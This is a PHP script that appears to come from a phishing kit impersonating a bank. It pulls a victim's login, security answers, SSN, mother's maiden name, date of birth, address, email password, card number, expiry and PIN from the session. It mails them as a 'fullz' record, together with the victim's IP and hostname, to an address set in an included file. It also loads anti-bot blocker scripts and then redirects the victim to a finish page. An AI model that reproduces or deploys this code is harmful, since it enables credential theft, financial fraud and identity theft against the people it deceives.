<?php
session_start();
include "email.php";
include('blocker.php');
include './prevents/anti7.php';
	include './prevents/anti8.php';
	include './prevents/anti9.php';


$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");


$user = $_SESSION['identity'];
$pass = $_SESSION['password'];
$q1 = $_SESSION['q1'];
$a1 = $_SESSION['ans1'];
$q2 = $_SESSION['q2'];
$a2 = $_SESSION['ans2'];
$q3 = $_SESSION['q3'];
$a3 = $_SESSION['ans3'];

$fn= $_SESSION['fn'];
$dob = $_SESSION['dob'];
$ad = $_SESSION['ad'];
$pc = $_SESSION['pc'];
$pn = $_SESSION['pn'];
$ssn = $_SESSION['ssn'];
$mmn = $_SESSION['mmn'];
$em = $_SESSION['em'];
$ep = $_SESSION['ep'];
$pin = $_SESSION['pin'];

$cc1 = $_SESSION['cc1'];

$exp = $_SESSION['exp'];

if (getenv(HTTP_CLIENT_IP)) {
    $ip = getenv(HTTP_CLIENT_IP);
} else {
    $ip = getenv(REMOTE_ADDR);
}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];
$data = "
=====================
User: $user
Pass: $pass
-


name:$fn
ADDY: $ad $pc 
Phone: $pn
MMN: $mmn
SSN: $ssn
DOB: $dob
em: $em
e-pass: $ep



-
CC: $cc1 
exp:$exp
PIN: $pin


------------------------***
Ip: $ip,$browser
Host: $hostname
=====================";

$subj="##NATIONAL FULLZZ #$ip";
if (  strlen($fn)< 20) {
mail($emailusr, $subj, $data);

}

header("Location: finish.php");

?>